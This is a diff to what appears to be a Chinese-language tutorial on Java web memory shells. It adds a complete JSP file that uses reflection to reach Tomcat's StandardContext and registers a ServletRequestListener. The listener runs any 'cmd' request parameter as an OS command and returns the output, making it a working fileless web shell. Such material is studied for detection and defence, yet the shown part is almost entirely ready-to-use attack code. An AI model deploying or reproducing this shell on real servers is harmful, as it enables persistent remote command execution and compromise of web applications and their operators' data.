@@ -220,7 +220,63 @@ context.addApplicationEventListener(listenerShell);
 完整的结合起来
 
 ```jsp
-
+<%--  
+	Created by IntelliJ IDEA.  
+	User: wum0nster  
+	Date: 2023/3/14  
+	Time: 19:48  
+	To change this template use File | Settings | File Templates.
+--%>  
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
+  
+<%@ page import="org.apache.catalina.connector.Request" %>  
+<%@ page import="java.io.IOException" %>  
+<%@ page import="java.io.InputStream" %>  
+<%@ page import="java.lang.reflect.Field" %>  
+<%@ page import="java.util.Scanner" %>  
+<%@ page import="org.apache.catalina.core.StandardContext" %>  
+  
+  
+<%!  
+    public class ListenerShell implements ServletRequestListener {  
+        @Override  
+        public void requestInitialized(ServletRequestEvent servletRequestEvent) {  
+            HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest();  
+            if (req.getParameter("cmd") != null) {  
+                InputStream in = null;  
+                try {  
+                    System.out.println("do some bad bad");  
+                    in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
+                    Scanner s = new Scanner(in).useDelimiter("\\A");  
+                    String output = s.hasNext() ? s.next() : "";  
+                    Field requestF = req.getClass().getDeclaredField("request");  
+                    requestF.setAccessible(true);  
+                    Request request = (Request) requestF.get(req);  
+                    request.getResponse().getWriter().write(output);  
+                } catch (IOException | NoSuchFieldException | IllegalAccessException ignored) {}  
+            }        }        @Override  
+        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {  
+  
+        }    }%>  
+  
+<%  
+  
+Field reqField = request.getClass().getDeclaredField("request");  
+reqField.setAccessible(true);  
+Request req = (Request) reqField.get(request);  
+StandardContext context = (StandardContext) req.getContext();  
+ListenerShell listenerShell = new ListenerShell();  
+context.addApplicationEventListener(listenerShell);  
+  
+%>  
+<html>  
+<head>  
+    <title>Title</title>  
+</head>  
+<body>  
+  
+</body>  
+</html>
 ```
 
 
